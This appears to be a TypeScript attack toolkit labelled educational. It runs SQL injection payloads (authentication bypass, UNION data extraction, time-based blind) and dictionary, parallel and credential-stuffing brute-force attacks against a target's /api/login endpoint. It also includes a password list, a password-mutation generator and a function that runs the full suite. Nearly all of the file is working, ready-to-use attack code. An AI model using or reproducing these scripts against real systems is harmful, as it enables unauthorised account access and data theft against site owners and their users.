/**
 * Professional SQL Injection & Brute Force Attack Examples
 * FOR EDUCATIONAL PURPOSES ONLY
 *
 * This file contains professional attack scripts demonstrating various
 * penetration testing techniques against vulnerable authentication systems.
 */

// ============================================================================
// SQL INJECTION ATTACKS
// ============================================================================

/**
 * Basic SQL Injection - Authentication Bypass
 * Exploits string concatenation in SQL queries
 */
export async function basicSQLInjection(targetUrl: string) {
  const payloads = [
    { username: "admin' OR '1'='1", password: "anything" },
    { username: "admin'--", password: "" },
    { username: "' OR 1=1--", password: "" },
    { username: "admin' #", password: "" },
    { username: "' OR 'a'='a", password: "' OR 'a'='a" },
  ]

  console.log("[SQL Injection] Starting basic authentication bypass...")

  for (const payload of payloads) {
    try {
      const response = await fetch(`${targetUrl}/api/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      })

      const data = await response.json()

      if (data.success) {
        console.log(`✓ SUCCESS: Payload worked!`)
        console.log(`  Username: ${payload.username}`)
        console.log(`  Password: ${payload.password}`)
        console.log(`  User Data:`, data.user)
        return data
      }
    } catch (error) {
      console.error(`✗ Error with payload:`, error)
    }
  }

  console.log("[SQL Injection] No successful bypass found")
  return null
}

/**
 * Advanced SQL Injection - UNION-based attack
 * Attempts to extract data using UNION SELECT
 */
export async function unionBasedSQLInjection(targetUrl: string) {
  const payloads = [
    "admin' UNION SELECT 1,'admin','password','admin@test.com','admin','active'--",
    "' UNION SELECT NULL,username,password,email,role,status FROM users--",
    "' UNION ALL SELECT 1,2,3,4,5,6--",
    "admin' UNION SELECT * FROM users WHERE '1'='1",
  ]

  console.log("[UNION SQL Injection] Starting advanced data extraction...")

  for (const username of payloads) {
    try {
      const response = await fetch(`${targetUrl}/api/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password: "anything" }),
      })

      const data = await response.json()

      if (data.success) {
        console.log(`✓ UNION attack successful!`)
        console.log(`  Payload: ${username}`)
        console.log(`  Extracted data:`, data)
        return data
      }
    } catch (error) {
      console.error(`✗ Error:`, error)
    }
  }

  return null
}

/**
 * Time-based Blind SQL Injection
 * Uses database sleep functions to detect vulnerabilities
 */
export async function timeBasedSQLInjection(targetUrl: string) {
  const payloads = [
    "admin' AND SLEEP(5)--",
    "admin' WAITFOR DELAY '00:00:05'--",
    "admin' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
  ]

  console.log("[Time-based SQL Injection] Testing for blind vulnerabilities...")

  for (const username of payloads) {
    const startTime = Date.now()

    try {
      await fetch(`${targetUrl}/api/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password: "test" }),
      })

      const responseTime = Date.now() - startTime

      if (responseTime > 4000) {
        console.log(`✓ Time-based injection detected!`)
        console.log(`  Response time: ${responseTime}ms`)
        console.log(`  Payload: ${username}`)
        return true
      }
    } catch (error) {
      console.error(`✗ Error:`, error)
    }
  }

  return false
}

// ============================================================================
// BRUTE FORCE ATTACKS
// ============================================================================

/**
 * Dictionary-based Brute Force Attack
 * Tests common passwords from a dictionary
 */
export async function dictionaryBruteForce(targetUrl: string, username = "admin", passwordList?: string[]) {
  const defaultPasswords = [
    "password",
    "123456",
    "12345678",
    "qwerty",
    "abc123",
    "monkey",
    "1234567",
    "letmein",
    "trustno1",
    "dragon",
    "baseball",
    "111111",
    "iloveyou",
    "master",
    "sunshine",
    "ashley",
    "bailey",
    "passw0rd",
    "shadow",
    "123123",
    "admin",
    "admin123",
    "root",
    "toor",
    "pass",
    "test",
    "guest",
    "oracle",
    "password1",
    "password123",
  ]

  const passwords = passwordList || defaultPasswords

  console.log(`[Brute Force] Starting dictionary attack on user: ${username}`)
  console.log(`[Brute Force] Testing ${passwords.length} passwords...`)

  let attempts = 0
  const startTime = Date.now()

  for (const password of passwords) {
    attempts++

    try {
      const response = await fetch(`${targetUrl}/api/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      })

      const data = await response.json()

      if (data.success) {
        const duration = ((Date.now() - startTime) / 1000).toFixed(2)
        console.log(`✓ PASSWORD FOUND!`)
        console.log(`  Username: ${username}`)
        console.log(`  Password: ${password}`)
        console.log(`  Attempts: ${attempts}`)
        console.log(`  Time: ${duration}s`)
        return { username, password, attempts, duration }
      }

      if (attempts % 10 === 0) {
        console.log(`  Progress: ${attempts}/${passwords.length} attempts...`)
      }
    } catch (error) {
      console.error(`✗ Error on attempt ${attempts}:`, error)
    }
  }

  console.log(`[Brute Force] Attack completed. No password found.`)
  return null
}

/**
 * Parallel Brute Force Attack
 * Tests multiple passwords simultaneously for faster results
 */
export async function parallelBruteForce(
  targetUrl: string,
  username = "admin",
  passwordList: string[],
  concurrency = 5,
) {
  console.log(`[Parallel Brute Force] Starting attack with ${concurrency} concurrent requests`)
  console.log(`[Parallel Brute Force] Target: ${username}`)
  console.log(`[Parallel Brute Force] Passwords to test: ${passwordList.length}`)

  const startTime = Date.now()
  let attempts = 0

  // Split passwords into chunks for parallel processing
  for (let i = 0; i < passwordList.length; i += concurrency) {
    const chunk = passwordList.slice(i, i + concurrency)

    const promises = chunk.map(async (password) => {
      attempts++

      try {
        const response = await fetch(`${targetUrl}/api/login`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ username, password }),
        })

        const data = await response.json()
        return { password, success: data.success, data }
      } catch (error) {
        return { password, success: false, error }
      }
    })

    const results = await Promise.all(promises)

    const success = results.find((r) => r.success)
    if (success) {
      const duration = ((Date.now() - startTime) / 1000).toFixed(2)
      console.log(`✓ PASSWORD CRACKED!`)
      console.log(`  Username: ${username}`)
      console.log(`  Password: ${success.password}`)
      console.log(`  Attempts: ${attempts}`)
      console.log(`  Time: ${duration}s`)
      console.log(`  Speed: ${(attempts / Number.parseFloat(duration)).toFixed(2)} attempts/sec`)
      return success
    }

    if (i % (concurrency * 5) === 0) {
      console.log(`  Progress: ${Math.min(i + concurrency, passwordList.length)}/${passwordList.length}`)
    }
  }

  console.log(`[Parallel Brute Force] Attack completed. No password found.`)
  return null
}

/**
 * Credential Stuffing Attack
 * Tests username:password combinations from leaked databases
 */
export async function credentialStuffing(
  targetUrl: string,
  credentials: Array<{ username: string; password: string }>,
) {
  console.log(`[Credential Stuffing] Starting attack with ${credentials.length} credential pairs`)

  const startTime = Date.now()
  const results = []

  for (let i = 0; i < credentials.length; i++) {
    const { username, password } = credentials[i]

    try {
      const response = await fetch(`${targetUrl}/api/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      })

      const data = await response.json()

      if (data.success) {
        console.log(`✓ Valid credentials found!`)
        console.log(`  Username: ${username}`)
        console.log(`  Password: ${password}`)
        results.push({ username, password, data })
      }

      if ((i + 1) % 20 === 0) {
        console.log(`  Progress: ${i + 1}/${credentials.length}`)
      }
    } catch (error) {
      console.error(`✗ Error testing ${username}:`, error)
    }
  }

  const duration = ((Date.now() - startTime) / 1000).toFixed(2)
  console.log(`[Credential Stuffing] Completed in ${duration}s`)
  console.log(`[Credential Stuffing] Found ${results.length} valid credentials`)

  return results
}

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

/**
 * Generate password variations
 * Creates common password mutations (l33t speak, capitalization, etc.)
 */
export function generatePasswordVariations(basePassword: string): string[] {
  const variations = [basePassword]

  // Capitalization variations
  variations.push(basePassword.toLowerCase())
  variations.push(basePassword.toUpperCase())
  variations.push(basePassword.charAt(0).toUpperCase() + basePassword.slice(1).toLowerCase())

  // Number additions
  for (let i = 0; i <= 9; i++) {
    variations.push(basePassword + i)
    variations.push(i + basePassword)
  }

  // Common substitutions (l33t speak)
  const l33t = basePassword
    .replace(/a/gi, "4")
    .replace(/e/gi, "3")
    .replace(/i/gi, "1")
    .replace(/o/gi, "0")
    .replace(/s/gi, "5")
    .replace(/t/gi, "7")

  variations.push(l33t)

  // Special character additions
  variations.push(basePassword + "!")
  variations.push(basePassword + "@")
  variations.push(basePassword + "#")

  return [...new Set(variations)] // Remove duplicates
}

/**
 * Load password list from common sources
 */
export function getCommonPasswords(): string[] {
  return [
    // Top 100 most common passwords
    "password",
    "123456",
    "12345678",
    "qwerty",
    "abc123",
    "monkey",
    "1234567",
    "letmein",
    "trustno1",
    "dragon",
    "baseball",
    "111111",
    "iloveyou",
    "master",
    "sunshine",
    "ashley",
    "bailey",
    "passw0rd",
    "shadow",
    "123123",
    "admin",
    "admin123",
    "root",
    "toor",
    "pass",
    "test",
    "guest",
    "oracle",
    "password1",
    "password123",
    "welcome",
    "login",
    "solo",
    "qazwsx",
    "ninja",
    "azerty",
    "loveme",
    "whatever",
    "donald",
    "batman",
    "zaq1zaq1",
    "Football",
    "starwars",
    "klaster",
    "mercedes",
    "password!",
    "Password1",
    "Password123",
    "P@ssw0rd",
    "P@ssword1",
  ]
}

// ============================================================================
// EXAMPLE USAGE
// ============================================================================

export async function runFullAttackSuite(targetUrl: string) {
  console.log("=".repeat(80))
  console.log("PROFESSIONAL PENETRATION TESTING SUITE")
  console.log("FOR EDUCATIONAL PURPOSES ONLY")
  console.log("=".repeat(80))
  console.log("")

  // 1. SQL Injection Attacks
  console.log("Phase 1: SQL Injection Testing")
  console.log("-".repeat(80))
  await basicSQLInjection(targetUrl)
  console.log("")

  await unionBasedSQLInjection(targetUrl)
  console.log("")

  await timeBasedSQLInjection(targetUrl)
  console.log("")

  // 2. Brute Force Attacks
  console.log("Phase 2: Brute Force Testing")
  console.log("-".repeat(80))
  const passwords = getCommonPasswords()
  await dictionaryBruteForce(targetUrl, "admin", passwords)
  console.log("")

  await parallelBruteForce(targetUrl, "admin", passwords, 10)
  console.log("")

  console.log("=".repeat(80))
  console.log("ATTACK SUITE COMPLETED")
  console.log("=".repeat(80))
}
